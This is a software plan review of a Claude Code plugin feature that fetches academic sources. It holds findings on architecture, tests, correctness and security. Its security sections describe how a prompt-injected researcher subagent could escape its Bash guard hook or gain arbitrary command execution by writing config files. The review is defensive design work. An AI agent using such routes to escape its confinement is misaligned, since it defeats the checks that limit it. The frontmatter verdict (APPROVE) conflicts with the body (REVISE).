---
type: "plan-review"
id: "2026-09-23-0280-academic-source-profiles-review-1"
title: "Plan Review: Academic Source Profiles Implementation Plan"
date: "2026-09-23T22:17:09+00:00"
author: "Toby Clemson"
producer: "review-plan"
status: "complete"
target: "plan:2026-09-23-0280-academic-source-profiles"
reviewer: "Toby Clemson"
verdict: "APPROVE"
lenses: ["architecture", "code-quality", "test-coverage", "correctness", "security", "usability", "compatibility", "performance"]
review_number: 1
review_pass: 8
tags: ["research", "cli", "hooks", "openalex", "arxiv"]
last_updated: "2026-09-24T12:02:08+00:00"
last_updated_by: "Toby Clemson"
schema_version: 1
---

## Plan Review: Academic Source Profiles Implementation Plan

**Verdict:** REVISE

The plan's architecture is sound. A pure `research` domain crate sits behind
`Transport`/`Clock`/`PacingGate` ports, mirroring `cli/design*`. Tiers are
derived in the CLI, not by the model. The credential ladder and test-loopback
seam are reused, and every phase can merge independently. The core rules check
out: the tier predicate matches all 17 rows, the confinement predicate matches
the AC matrix, and the 3/6/12 s schedule yields the required attempt counts.
Two classes of problem remain. First, the plan's edges are under-specified: how
the guard handles its forwarded `--fail-safe` flag, a per-call deadline against
the Bash tool timeout, the pacing gate's interaction with retries, and the
parsing and confirmation ports. Second, the new `Bash` grant opens an
escalation path through the researcher's unrestricted `Write`. Two findings
were verified against source: the guard receives `--fail-safe`
(`cli/launcher/src/launch/core.rs:216`), and `resolve_token` does not refuse a
tracked `config.local.md` holding a plain value (`credentials.rs:261-292`).

### Cross-Cutting Themes

- **Guard exit `2` on parse failure blocks every Bash call** (flagged by:
  correctness, compatibility, code-quality). The launcher forwards
  `--fail-safe` to `accelerator-research guard`. The plan says the guard needs
  no separate `--fail-safe` behaviour, and assigns exit `2` to usage errors. If
  clap rejects the flag, every `PreToolUse` `Bash` call for every plugin user
  is blocked.
- **No overall deadline per fetch call** (flagged by: correctness,
  performance, usability). Lock wait (120 s), retries (4 × 30 s timeouts +
  21 s backoff, or 3 × 30 s `Retry-After`) and withdrawal confirmations exceed
  Claude Code's ~120 s Bash timeout. The `status: "unavailable"` contract then
  never fires.
- **Pacing gate semantics under throttling** (flagged by: architecture,
  performance, code-quality, correctness, test-coverage). The plan leaves
  several things unspecified: whether backoff happens under the lock, how
  throttling is shared across processes (a thundering herd), how
  `Clock`/deadline injection works for ceiling tests, lock fairness, and
  clamping of the persisted timestamp.
- **Fetch port shape and ownership of arXiv confirmation** (flagged by:
  architecture, code-quality). The domain `fetch` returns `Records` without
  parsing, and no decoder port is named. The two-stage arXiv
  search → confirm → verdict flow appears only under Phase 5 "Wiring", so it
  risks landing in the composition root.
- **Deterministic `conduct` logic left in SKILL.md prose** (flagged by:
  architecture, code-quality, correctness, usability, compatibility). The prose
  covers pair enumeration, `<nn>` allocation and reuse, slug derivation, and
  suffix parsing. It contradicts the plan's "deterministic behaviour lives in
  Rust" principle and has concrete defects: parallel pairs split `<nn>`, the
  em-dash suffix is fragile, and non-ASCII slugs are ambiguous.
- **Free-text queries not escaped for upstream syntax** (flagged by:
  correctness, compatibility). A comma inside
  `filter=title_and_abstract.search:` makes the filter malformed. arXiv
  operator words and parentheses change the query's meaning. DOI path segments
  are not percent-encoded.
- **Degraded outcomes do not reach the user** (flagged by: usability,
  architecture, performance). Outstanding pairs are named without a reason or a
  recovery step. One failed withdrawal confirmation also discards the whole
  arXiv result set.

### Tradeoff Analysis

- **Security vs Compatibility/Performance (guard failure mode)**: security
  wants the guard to fail closed for researcher calls. Compatibility and
  performance want the guard lean and non-blocking for the ~100% of `Bash`
  calls that are not a researcher's. Recommendation: fail closed only when
  stdin shows a researcher `agent_type` with a non-empty `agent_id`, and pass
  everything else.
- **Degradation granularity vs contract simplicity (withdrawal)**:
  architecture and performance prefer per-record degradation when a
  confirmation fails. The amended A3 keeps a whole-call `unavailable` so the
  model never cites an unconfirmed withdrawal as `tier-2`. This is a real
  judgement call; if the whole-call rule stays, record why.
- **Prose vs CLI for `conduct` allocation**: moving allocation into a CLI verb
  makes it testable, but it adds scope to an already large story. The minimal
  alternative is to specify `<nn>` allocation per focus area and state that
  consumers group by frontmatter.

### Findings

#### Major

- 🟡 **Correctness + Compatibility + Code Quality**: The guard must accept the
  forwarded `--fail-safe` flag, or every Bash call is blocked
  **Location**: Phase 6 §2–3
  Clap rejects an undeclared `--fail-safe` with exit `2`, which Claude Code
  treats as a block on every `Bash` call. Declare the flag, map every guard
  parse or usage failure to exit `0`, and test through the launcher.
- 🟡 **Security**: The confined researcher can use its unrestricted `Write` to
  un-confine itself or to get code execution through the permitted command
  **Location**: Phase 6; What We're NOT Doing
  Writing `agents.researcher` into `config.md` changes the name the guard
  matches, so the researcher is no longer confined. Writing
  `openalex.api_key_cmd` into an existing 0600 `config.local.md` makes the
  next permitted `research fetch openalex` call run an arbitrary command.
- 🟡 **Correctness + Performance + Usability**: The worst-case fetch duration
  exceeds the Bash tool timeout
  **Location**: Phase 3 §5; Phase 5 §2
  Without a single per-call deadline threaded through retries, the lock wait
  and confirmations, the process is killed before it can emit
  `status: "unavailable"`.
- 🟡 **Correctness**: The Phase 1 amendment leaves 0280's retry sentence
  contradicting the new budget rule
  **Location**: Phase 1 item 1
  "a `429` without `X-RateLimit-Remaining: 0`" still says to retry a `429`
  with Remaining 5 / Required 10, while the new AC says one attempt and
  `budget_exhausted`.
- 🟡 **Correctness**: `resolve_token` does not refuse a tracked
  `config.local.md` that holds a plain `api_key`
  **Location**: Phase 4 §2, §5
  `refuse_tracked_source` guards only the `_cmd` rung (verified). The planned
  "tracked → non-zero" test would either fail or pass only through the
  0644-mode refusal.
- 🟡 **Correctness**: Parallel pairs of one focus area split `<nn>`
  **Location**: Phase 7 §2
  The rule reuses a *retained* finding's `<nn>`, but none exists when
  `web, openalex` start together. Allocate once per focus area, before
  spawning.
- 🟡 **Correctness + Compatibility**: Free-text queries are not sanitised for
  OpenAlex filter or arXiv query syntax
  **Location**: Phase 3 `request`; Phase 4 §1
  A comma in a query gives `400` → exit `1` → a permanently outstanding pair.
- 🟡 **Architecture + Code Quality**: The fetch port shapes leave parsing and
  arXiv withdrawal confirmation without an owner
  **Location**: Phase 3 §5; Phase 5 §3
  Name a per-source decoder port, and model search → confirm as a domain
  workflow that reuses the retry and classification loop.
- 🟡 **Architecture + Performance + Code Quality**: The pacing gate's
  interaction with retries, shared throttling and time injection is
  unspecified
  **Location**: Phase 5 §2
  Specify per-attempt acquisition with backoff sleeps outside the lock, and a
  shared "not before" instant after throttling. Inject `Clock` so the 120 s
  ceiling and the spacing can be unit-tested.
- 🟡 **Architecture + Code Quality**: Deterministic pairing and allocation
  logic stays in model-executed prose while becoming a cross-component
  contract
  **Location**: Phase 7 §2
  Move it into a small CLI verb, or at least state that consumers (0281, 0284)
  group findings by frontmatter, not by filename.
- 🟡 **Performance**: Guard latency is understated
  **Location**: Performance Considerations; Phase 6 §3
  Every `Bash` call pays a second `bin/accelerator` bootstrap plus launcher
  re-verification of the full `accelerator-research` binary (reqwest, rustls,
  roxmltree). Measure p50/p95 before and after, and consider a lean guard
  binary.
- 🟡 **Performance**: A thundering herd forms under arXiv capacity throttling
  **Location**: Phase 5 §2; Phase 3 §4
  N queued researchers each retry independently, about 4N doomed requests
  spaced 3 s apart.
- 🟡 **Test Coverage**: Binary-level tests run through the real 3/6/12 s
  clock
  **Location**: Phase 4 §5; Phase 5 §5
  The 5xx secrecy test, the arXiv `403`/`406` test and the confirmation `503`
  test each sleep 21 s or more. Add a `test-loopback` recording-clock seam.
- 🟡 **Test Coverage**: Rate-limit header extraction is untested outside the
  domain
  **Location**: Phase 4 §5
  No binary test sends a `409` or a budget-exhausted `429`, so a header-name
  typo would go unnoticed.
- 🟡 **Test Coverage**: No end-to-end golden test of the emitted JSON record
  contract
  **Location**: Phase 3 §2; Phase 4 `render.rs`
  Nothing checks the DOI prefix handling, the `abstract` rename, the
  `venue_signals` keys, or arXiv URL version-stripping and scheme upgrade.
- 🟡 **Test Coverage**: `HttpTransport`'s redirect, header and body-bound
  policy is untested
  **Location**: Phase 4 §1
  This covers same-host `301`, cross-host refusal without forwarding
  `Authorization`, the three-hop cap, the 8 MiB bound, and
  `User-Agent`/`Accept`.
- 🟡 **Usability**: Outstanding pairs are named without a reason or recovery
  step
  **Location**: Phase 7 §2
  A keyless user cannot tell that `budget_exhausted` means "configure
  `openalex.api_key`".
- 🟡 **Usability**: The researcher's permission-prompt experience is left
  undecided, and the allow rule is spelt two ways
  **Location**: Phase 6 Manual Verification; Phase 8 §2
  The rule appears as `Bash(accelerator research fetch *)` in one place and
  `Bash(accelerator research fetch:*)` in another.
- 🟡 **Usability**: The em-dash `— profiles:` suffix silently misparses when
  hand-edited
  **Location**: Phase 7 §2
  `- profiles:` or `-- profiles:` falls back to `web`, and the suffix text
  leaks into the question and the slug.

#### Minor

- 🔵 **Correctness**: The pacing wait comes from a persisted wall-clock
  timestamp and is unbounded. Clamp it to [0, 3 s] and treat a corrupt file as
  absent. (Phase 5 §2)
- 🔵 **Correctness**: Checkbox state has an unreachable "complete" state for
  skipped profiles and no transition back from `[x]` to `[ ]`. (Phase 7 §2)
- 🔵 **Correctness**: The multi-profile fixture pairs an unticked `arxiv` item
  with its retained finding. (Phase 7 §1)
- 🔵 **Correctness**: A versioned arXiv lookup can miss a withdrawal. Strip
  the version before querying. (Phase 5 §3)
- 🔵 **Correctness + Usability**: The `KeyRejected` message is wrong on a
  keyless request and always points at `openalex.api_key`, whichever rung
  supplied the key. (Phase 3 §4; Phase 4 §2)
- 🔵 **Correctness**: The classification table has no row for an unfollowed
  `3xx`. (Phase 3 §4)
- 🔵 **Security**: The guard fails open, and a researcher with write access
  can induce the failure. (Phase 6 §3)
- 🔵 **Security**: `FORBIDDEN_FRAGMENTS` allows `$VAR`, `${…}`, glob, `~` and
  brace expansion, which can leak environment secrets into upstream queries.
  (Phase 6 §1)
- 🔵 **Security**: The redirect policy checks the host only, not the scheme
  and port. (Phase 4 §1)
- 🔵 **Security**: DOIs and arXiv IDs taken from responses flow unvalidated
  into URLs, OAI requests and markdown. (Phase 3 §2; Phase 5 §3)
- 🔵 **Security + Code Quality**: The guard passes silently on unreadable
  input or config, or on hook-schema drift. Add a stderr diagnostic.
  (Phase 6 §2)
- 🔵 **Architecture**: `research-cli` now depends on the tracker-scoped
  `tracker-support` crate without the boundary being restated. (Phase 4 §2)
- 🔵 **Architecture**: The guard's exit-`2`/stderr block convention diverges
  from `vcs guard`'s `pre_tool_use_deny` envelope without acknowledging it.
  (Phase 6 §2)
- 🔵 **Architecture + Performance**: One failed withdrawal confirmation
  discards the whole call's records, and confirmations are not cached.
  (Phase 1 item 3; Phase 5 §3)
- 🔵 **Code Quality**: Researcher-name resolution becomes a third copy of the
  same logic (`launcher/agents.rs`, `work-cli/config.rs`). (Phase 6 §2)
- 🔵 **Code Quality**: The tier predicate mixes `&&` and `||` without
  grouping. Extract named predicates. (Phase 3 §3)
- 🔵 **Code Quality**: The retry and clock vocabulary diverges from
  `tracker_support::Sleeper`/`RetryPolicy`, and the retry index is ambiguous
  between 0- and 1-based. (Phase 3 §4)
- 🔵 **Code Quality**: The `CredentialContext` assembly is copied a fourth
  time. (Phase 4 §2)
- 🔵 **Code Quality**: `FORBIDDEN_FRAGMENTS` has redundant `<(`/`>(` entries
  and duplicates the profile prose without a contract test. (Phase 6 §1)
- 🔵 **Test Coverage**: The `--help` content AC has no test. (Phase 4 §5)
- 🔵 **Test Coverage**: arXiv happy paths, the `Error`-titled feed, and
  pacing of the OAI confirmation are untested at binary level. (Phase 5 §5)
- 🔵 **Test Coverage**: The pacing ceiling is untested, and the concurrent
  test may not actually overlap. Force it with `Route::Stall`. (Phase 5 §5)
- 🔵 **Test Coverage**: The guard's fail-open inputs are untested, and the
  matrix is duplicated at domain and binary level. (Phase 6 §5)
- 🔵 **Test Coverage**: Boundary cases for abstract truncation (600/601,
  multibyte) and outcome precedence are missing. (Phase 3)
- 🔵 **Usability**: The guard's block message does not say what triggered the
  block. (Phase 6 §2)
- 🔵 **Usability**: Usage and malformed-ID errors have no specified content
  or `E_*` codes. (Phase 4 §2; Phase 5 §3)
- 🔵 **Compatibility**: The guard adds a fetch and integrity-verification
  dependency to every user's `Bash` calls. (Phase 6 §3)
- 🔵 **Compatibility**: Ejected topic-research templates keep a hardcoded
  `source_profile: "web"`. (Phase 7 §3; Migration Notes)
- 🔵 **Compatibility**: A custom `agents.researcher` override lacks `Bash`,
  so its academic pairs never complete. (Phase 6 §4; Migration Notes)
- 🔵 **Performance**: The non-FIFO polled lock and fixed 120 s ceiling can
  starve waiters in large rounds. (Phase 5 §2)
- 🔵 **Performance**: The profiles set no per-researcher call budget.
  (Phase 4 §4; Phase 5 §4)
- 🔵 **Performance**: Pooled keep-alive connections can break "one connection
  at a time". (Phase 4 §1; Phase 5 §2)

#### Suggestions

- 🔵 **Architecture**: Adding the next scholarly source means editing every
  per-concern module. Consider a `SourceFamily` grouping. (Phase 3 §2)
- 🔵 **Architecture**: The domain import rule admits all of `kernel` rather
  than `^kernel::Error`. (Phase 3 §1)
- 🔵 **Security**: Classify credential keys as secret in the catalogue rather
  than in a `dump.rs` leaf list. (Phase 2 §3)
- 🔵 **Code Quality**: Carry headers and auth on `UpstreamRequest` so
  `HttpTransport` stays source-agnostic. (Phase 4 §1)
- 🔵 **Test Coverage**: Make the `HttpTransport` timeout injectable, and test
  that timeouts and connection failures become `Attempt` values. (Phase 4 §1)
- 🔵 **Usability**: Keep guard-availability stderr noise concise, or report
  it once per session. (Phase 6 §3)
- 🔵 **Performance**: Pre-warm the research sub-binary from `SessionStart`.
  (Phase 6 §3)
- 🔵 **Correctness**: Accept `https://openalex.org/W…` in `OpenAlexId` so the
  CLI's own `url` round-trips. (Phase 3 §2)

### Strengths

- ✅ The three-crate hexagonal split (`research` / `research-adapters` /
  `research-cli`) mirrors `cli/design*` and is enforced by `pup.ron` and the
  public-api pin.
- ✅ `openalex_tier` gives the right answer for all 17 tier-table rows. The
  confinement predicate matches every AC allow and block case. The schedule
  yields exactly 4 attempts, with `Retry-After` clamped as specified.
- ✅ Classification is per source, which models the real divergence of
  OpenAlex and arXiv status semantics (A1, A2, A4).
- ✅ Tiers are derived deterministically in the CLI, so a prompt-injected
  abstract cannot raise its own tier.
- ✅ Credentials reuse the hardened ladder, with shared-`_cmd` refusal, the
  0600 gate, and tests keeping the key out of the URL, stdout and stderr.
- ✅ The test-loopback seam is stricter than Jira's: loopback-only, a marker
  scanned in release artefacts, and a `compile_error!` guard.
- ✅ Red-first ordering is explicit throughout Phase 2. Exact-prefix
  credential assertions stop the `_cmd_cmd` defect from coming back.
- ✅ Every phase has a stated reason it can merge alone. Legacy sets need no
  migration, because unsuffixed items default to `web` and pairs match on
  frontmatter.
- ✅ Keying the guard on `agent_id` as well as `agent_type` handles
  `--agent` main-thread sessions. The platform dependency (v2.1.69) sits below
  the v2.1.144 floor.
- ✅ Model-behaviour criteria become a concrete attended matrix with a 3-of-3
  bar and a `PATH` shim.

### Recommended Changes

1. **Declare `--fail-safe` on `guard` and make every guard parse or usage
   failure exit `0`** (addresses: guard `--fail-safe`/exit `2`). Add a
   launcher-level test: `guard --fail-safe` with non-researcher input exits
   `0`.
2. **Close the Write-based escalation** (addresses: confinement bypass via
   Write; guard fails open). Always confine `accelerator:researcher` as well
   as the configured name. Either block researcher `Write`/`Edit` outside
   `findings/` (at least under `.accelerator/`), or record this specific path
   as an accepted risk. Forbid `$` entirely, plus unquoted glob and brace
   expansion.
3. **Add a per-call deadline (~90–100 s) threaded through `fetch`,
   `PacingGate` and confirmations** (addresses: fetch timeout ×3; pacing
   ceiling). When the deadline is exhausted, return `Unavailable` with the
   last reason. Add a domain test using the recording clock.
4. **Specify the port contracts and pacing semantics in Phase 3/5**
   (addresses: fetch port shapes; pacing gate; thundering herd). Add a decoder
   port. Model search → confirm as a domain workflow. Acquire the gate per
   attempt, with backoff outside the lock and a shared "not before" instant
   after throttling. Inject `Clock` into `FilePacingGate`, and clamp the
   persisted timestamp.
5. **Fix the Phase 1 amendment and the tracked-value refusal** (addresses:
   retry sentence contradiction; tracked `api_key`). Rewrite 0280's retry
   sentence and schedule AC to say "a `429` that is not budget exhaustion".
   Either add tracked-provenance refusal to the personal value rung
   (test-first, noting the Jira and Linear effect), or narrow 0280's AC. Use a
   0600 tracked fixture.
6. **Specify query normalisation in `request`** (addresses: query escaping).
   Strip `,`, `|` and `:` for OpenAlex. Quote terms and neutralise operators
   and parentheses for arXiv. Percent-encode DOI path segments. Add test rows.
7. **Tighten Phase 7 allocation rules** (addresses: `<nn>` split;
   deterministic prose; suffix parsing; slug; checkbox states; fixture).
   Allocate `<nn>` once per focus area before spawning. Accept `—`, `–` and
   `--` as the suffix separator. Use ASCII `[a-z0-9]` slugs with a fallback.
   Set checkboxes in both directions from finding-derived state. Tick the
   fixture's `arxiv` item. State that consumers group by frontmatter.
   Optionally, move allocation into a CLI verb.
8. **Close the adapter-seam test gaps** (addresses: real-clock tests, header
   extraction, JSON golden, `HttpTransport` policy, arXiv happy paths,
   `--help`). Add a `test-loopback` recording-clock seam. Add binary tests for
   `409` and budget-exhausted `429`. Add golden JSON tests from recorded
   fixtures, and redirect/header/body-bound tests. Make the redirect policy
   same-origin and HTTPS-only.
9. **Measure and bound guard latency** (addresses: guard latency). Add a
   p50/p95 before/after criterion to Phase 6. Consider a lean guard binary
   that does not link the HTTP, TLS and XML stack. Correct the Performance
   Considerations.
10. **Surface reasons and recovery for outstanding pairs** (addresses:
    outstanding reasons; `KeyRejected` wording; permission prompt). The
    Unavailable outcome returns `source`/`reason`, and `conduct` maps each
    reason to a next step. Pass the key source and whether a key was sent to
    the `KeyRejected` message. Settle the permission-prompt question before
    Phase 7, using one canonical rule syntax.
11. **Add Migration Notes entries** (addresses: ejected templates; custom
    researcher). Ejected finding and outline templates need `diff`/`reset`,
    and a custom researcher must grant `Bash`.

## Per-Lens Results

### Architecture

**Summary**: The plan keeps the hexagonal layout and reuses the existing
credential, loopback and dispatch-coherence machinery. The gaps are at port
boundaries (how `fetch` produces `Record`s without parsing, and where arXiv
confirmation runs), in pacing-gate resilience, and in deterministic filename
logic moving into prose despite being a cross-component contract.

**Strengths**: The three-crate split follows `cli/design*` and is enforced by
tooling. Classification is per source. Rules are pure functions behind ports.
Tiers are deterministic in the CLI. The mergeability table and backward
compatibility are well handled. Known tradeoffs are named.

**Findings**:
- 🟡 major / high — *Phase 3 §5; Phase 5 §3* — The domain fetch port cannot
  produce Records without parsing, and the dependent arXiv confirmation has no
  owner. Name a `ResponseDecoder` port, and model `search_then_confirm` in the
  domain.
- 🟡 major / medium — *Phase 5 §2* — The pacing gate's interaction with
  retries and throttling is unspecified. Acquire it per attempt, back off
  outside the lock, and share a "not before" instant.
- 🟡 major / medium — *Phase 7 §2* — Deterministic pairing and allocation
  stay in prose while becoming a contract for 0284 and 0281. Move them into a
  CLI verb, or state that consumers group by frontmatter.
- 🔵 minor / medium — *Phase 1 item 3; Phase 5 §3* — One failed confirmation
  discards the whole call. Consider per-record degradation, or record the
  rationale.
- 🔵 minor / high — *Phase 4 §2* — `research-cli` consumes the tracker-scoped
  `tracker-support`. Restate the boundary, and explain the separate `Clock`.
- 🔵 minor / high — *Phase 6 §2* — The guard's block convention diverges from
  `vcs guard`'s JSON envelope. Justify the difference, or emit both.
- 🔵 suggestion / medium — *Phase 3 §2* — Adding the next source touches
  every module. Consider a `SourceFamily` grouping.
- 🔵 suggestion / medium — *Phase 3 §1* — The import rule admits all of
  `kernel`. Mirror `^kernel::Error`.

### Code Quality

**Summary**: The layering and test-first approach are solid. The weaknesses
are at the seams: port shapes, pacing-gate timing that cannot be injected,
logic duplicated across crates, and a deterministic algorithm placed in
SKILL.md prose.

**Strengths**: A clean three-crate split. Pure classification and schedule.
Exact-prefix credential tests and a named `CREDENTIAL_LEAVES`. A single source
of truth for `config help`. A deliberate domain vocabulary.

**Findings**:
- 🟡 major / high — *Phase 3 §5; Phase 5 §3* — The fetch port shapes leave
  ownership of parsing and confirmation ambiguous. Define the ports, and put
  candidate → confirm → verdict and the arXiv lookup-miss rule in the domain.
- 🟡 major / medium — *Phase 5 §2* — `FilePacingGate` hard-wires real time.
  Use `paced(&self, send)` with an injected clock, lock and store.
- 🟡 major / medium — *Phase 7 §2* — Deterministic allocation lives in
  model-executed prose. Move it into a CLI verb, or record an explicit
  carve-out.
- 🔵 minor / high — *Phase 6 §2* — Researcher-name resolution becomes a third
  copy. Promote it to the `config` crate.
- 🔵 minor / medium — *Phase 6 §2–3* — The guard swallows unreadable
  input and config silently and carries an ignored `--fail-safe`. Add
  diagnostics, declare the flag, and avoid exit `2` on usage errors.
- 🔵 minor / high — *Phase 3 §3* — The tier predicate mixes `&&` and `||`.
  Extract `is_peer_reviewed_publication` and `is_early_version`.
- 🔵 minor / medium — *Phase 3 §2, §4* — Retry and clock vocabulary diverges
  from the workspace, the retry index is ambiguous, and the unit-struct
  namespace is unnecessary.
- 🔵 minor / medium — *Phase 4 §2* — `CredentialContext` assembly is copied a
  fourth time. Add `CredentialContext::for_project_root`.
- 🔵 minor / medium — *Phase 6 §1* — `FORBIDDEN_FRAGMENTS` has redundant
  entries and drifts from the profile prose. Add a contract test.
- 🔵 suggestion / low — *Phase 4 §1; Phase 5 §3* — Source-specific headers
  risk flag-driven branching. Carry them on `UpstreamRequest`, and add
  non-secret diagnostic context.

### Test Coverage

**Summary**: The domain pyramid is strong. The adapter seam is thin:
header→`Attempt` conversion, `HttpTransport` policy and the rendered JSON
contract are untested, and several binary tests sleep through the real retry
clock.

**Strengths**: Explicit red-first ordering. A 17-row tier table. Retry
behaviour tested behind ports. `server.hits == 0` assertions. Full
credential-ladder and secrecy coverage. A full confinement matrix plus a
`--fail-safe` smoke test. Existing help-routing tests. A concrete attended
matrix.

**Findings**:
- 🟡 major / high — *Phase 4 §5; Phase 5 §5* — Binary tests run through the
  real 3/6/12 s clock. Add a `test-loopback` recording-clock seam.
- 🟡 major / high — *Phase 4 §5* — Rate-limit header extraction is unguarded.
  Add binary tests for `409` and budget-exhausted `429`, and an adapter
  `Retry-After` test.
- 🟡 major / high — *Phase 3 §2; Phase 4 render* — There is no end-to-end
  JSON contract test. Add golden tests from recorded fixtures.
- 🟡 major / high — *Phase 4 §1* — `HttpTransport`'s redirect, header and
  body-bound policy is untested.
- 🔵 minor / high — *Phase 4 §5* — The `--help` content AC is untested.
- 🔵 minor / high — *Phase 5 §5* — arXiv happy paths and error-feed handling
  are untested at binary level.
- 🔵 minor / medium — *Phase 5 §2, §5* — The pacing ceiling is untested, and
  the concurrent test may not overlap.
- 🔵 minor / high — *Phase 6 §2, §5* — Fail-open inputs are untested, and the
  matrix is duplicated at two levels.
- 🔵 minor / medium — *Phase 3* — Boundary cases for truncation and outcome
  precedence are missing.
- 🔵 suggestion / medium — *Phase 4 §1* — The mapping from timeout and
  connection failure to `Attempt` is untested. Make the timeout injectable.

### Correctness

**Summary**: The core rules are correct: all 17 tier rows, the confinement
matrix, and the schedule. The risks are at the edges: the unamended retry
sentence, the ladder refusal that is never performed, the forwarded
`--fail-safe`, `<nn>` sharing, the per-call deadline, and query escaping.

**Strengths**: The tier predicate's precedence is correct. The confinement
rule matches the AC exactly. The `agent_id` + `agent_type` gating is correct.
The schedule arithmetic is correct. The pacing gate gives both one-connection
and start-to-start spacing. The budget rule fixes the 1–9-credit case.

**Findings**:
- 🟡 major / high — *Phase 6 §2–3* — The guard must accept the forwarded
  `--fail-safe` flag, or every Bash call is blocked.
- 🟡 major / high — *Phase 1 item 1* — The amendment leaves the retry
  sentence contradicting the budget rule.
- 🟡 major / high — *Phase 4 §2, §5* — `resolve_token` does not refuse a
  tracked `config.local.md` with a plain `api_key`.
- 🟡 major / medium — *Phase 7 §2* — `<nn>` reuse keys on retained findings,
  which do not exist when pairs start together.
- 🟡 major / medium — *Phase 3 §5; Phase 5 §2* — Worst-case duration exceeds
  the Bash timeout.
- 🟡 major / medium — *Phase 3 request; Phase 4 §1* — Free-text queries are
  not sanitised for upstream syntax, and DOI paths are not encoded.
- 🔵 minor / medium — *Phase 5 §2* — The persisted wall-clock pacing wait is
  unbounded.
- 🔵 minor / medium — *Phase 7 §2* — Checkbox state has an unreachable
  complete state and no un-tick.
- 🔵 minor / medium — *Phase 7 §1* — The fixture pairs an unticked item with
  a retained finding.
- 🔵 minor / medium — *Phase 5 §3* — A versioned arXiv lookup can miss a
  withdrawal.
- 🔵 minor / medium — *Phase 3 §4* — `KeyRejected` is wrong on a keyless
  request.
- 🔵 minor / low — *Phase 3 §4; Phase 4* — There is no classification row
  for an unfollowed `3xx`.
- 🔵 suggestion / low — *Phase 3 §2, §4* — `OpenAlexId` does not accept the
  CLI's own URL form, and the retry index base is ambiguous.

### Security

**Summary**: Secrets handling is careful. The main weakness is that the guard
trusts config and binaries the prompt-injectable researcher can still modify
through `Write`, and it then allows arbitrary shell through the permitted
command. The smaller gaps are expansion characters, redirect origin checks,
and identifiers from responses.

**Strengths**: A hardened credential ladder with secrecy tests. A stricter
loopback seam. A bounded transport. Deterministic tiers resist injection.
`agent_id` gating. `roxmltree` does not resolve entities. Red-first dump
redaction.

**Findings**:
- 🟡 major / high — *Phase 6; What We're NOT Doing* — The confined researcher
  can disable the guard or get code execution through `Write`: by rewriting
  `agents.researcher`, or `openalex.api_key_cmd` in a 0600
  `config.local.md`.
- 🔵 minor / medium — *Phase 6 §3* — The guard fails open, and the failure
  can be induced. Fail closed for researcher-shaped input when the guard
  cannot be resolved.
- 🔵 minor / medium — *Phase 6 §1* — Forbidden fragments allow `$VAR`,
  `${…}`, glob and brace expansion.
- 🔵 minor / medium — *Phase 4 §1* — The redirect policy checks the host
  only, not the scheme and port.
- 🔵 minor / medium — *Phase 3 §2; Phase 5 §3* — Identifiers from responses
  flow unvalidated into URLs and markdown.
- 🔵 minor / low — *Phase 6 §2* — The guard passes silently if the hook-input
  schema drifts.
- 🔵 suggestion / medium — *Phase 2 §3* — Secret classification is a
  hardcoded leaf list in `dump.rs`.

### Usability

**Summary**: The opt-in, symmetric CLI and the gains in config
discoverability are good. The weak spots are the degraded and failure paths:
reasons never reach the user, the Bash timeout can be exceeded, the permission
prompt is undecided, and error messages point at the wrong place.

**Strengths**: Progressive disclosure (a `["web"]` default). A small,
symmetric CLI grammar. Keyless operation works and a bad key fails loudly.
`config help` lists keys and the `_cmd_cmd` text is fixed. A structured
unavailable status.

**Findings**:
- 🟡 major / medium — *Phase 3 §5; Phase 5 §2* — Worst-case fetch exceeds the
  Bash timeout.
- 🟡 major / high — *Phase 7 §2* — Outstanding pairs are named without reason
  or recovery.
- 🟡 major / medium — *Phase 6; Phase 8* — The permission prompt is
  undecided, and the allow-rule syntax is inconsistent.
- 🟡 major / medium — *Phase 7 §2* — The em-dash suffix silently misparses
  when hand-edited.
- 🔵 minor / high — *Phase 4 §2* — The key-rejected message always points at
  `openalex.api_key`.
- 🔵 minor / medium — *Phase 6 §2* — The guard's block message does not say
  what triggered the block.
- 🔵 minor / medium — *Phase 4 §2; Phase 5 §3* — Usage and malformed-ID
  errors have no specified content or codes.
- 🔵 suggestion / low — *Phase 6 §3* — Guard-availability failures add stderr
  noise to every Bash call.

### Compatibility

**Summary**: Backward compatibility for legacy sets, the Jira text fix and
the sibling contracts is handled carefully. The main risk is that the guard
receives the forwarded `--fail-safe` while exit `2` is its usage-error code.
Smaller gaps cover ejected templates, custom researchers and query syntax.

**Strengths**: Migration Notes for legacy sets. The credential fix is pinned,
and the `allowed_sites` caller is corrected too. Researcher-name resolution is
consistent with `conduct`. The platform floor is unaffected. Independent
mergeability. The pathed hook form.

**Findings**:
- 🟡 major / high — *Phase 6 §2–3* — The guard receives the forwarded
  `--fail-safe`, and a parse error exits `2`, blocking every Bash call.
- 🔵 minor / medium — *Phase 6 §3* — The new per-Bash hook adds a fetch and
  integrity dependency for every user. Integrity refusals are not swallowed.
- 🔵 minor / medium — *Phase 7 §3; Migration Notes* — Ejected templates keep
  a hardcoded `source_profile: "web"`.
- 🔵 minor / medium — *Phase 6 §4; Migration Notes* — Custom
  `agents.researcher` overrides lack `Bash`.
- 🔵 minor / medium — *Phase 4 §1; Phase 3 request* — Free-text queries are
  not escaped for OpenAlex filter and arXiv syntax.
- 🔵 minor / medium — *Phase 7 §2* — The slug and suffix rules are ambiguous
  for non-ASCII and hand-edited input.

### Performance

**Summary**: Requests are lean. The risks are in time budgets and shared
resources: understated guard latency on every Bash call, no per-call deadline,
and no shared backoff or fairness among parallel arXiv researchers.

**Strengths**: A `select` projection and `per_page` = limit. A bounded
transport. A trivial guard decision. Clock-injected schedule tests. Pacing
based on elapsed time.

**Findings**:
- 🟡 major / high — *Performance Considerations; Phase 6 §3* — Guard latency
  is understated: a second launcher bootstrap plus re-verification of a heavy
  binary on every Bash call.
- 🟡 major / high — *Phase 3 §5; Phase 5 §2–3* — There is no overall
  per-call deadline.
- 🟡 major / medium — *Phase 5 §2; Phase 3 §4* — A thundering herd forms
  under arXiv capacity throttling.
- 🔵 minor / medium — *Phase 5 §2; Assumptions* — The non-FIFO polled lock
  and fixed 120 s ceiling cause starvation and spurious unavailability.
- 🔵 minor / medium — *Phase 4 §4; Phase 5 §4* — There is no per-researcher
  call budget.
- 🔵 minor / medium — *Phase 1 item 3; Phase 5 §3* — Withdrawal
  confirmations amplify requests and are never cached.
- 🔵 minor / low — *Phase 4 §1; Phase 5 §2* — Pooled keep-alive connections
  can break "one connection at a time".
- 🔵 suggestion / low — *Phase 6 §3* — The cold-start download lands on the
  first Bash call.

---
*Review generated by /accelerator:review-plan*

## Re-Review (Pass 2) — 2026-09-23T23:11:51+00:00

**Verdict:** REVISE

### Previously Identified Issues

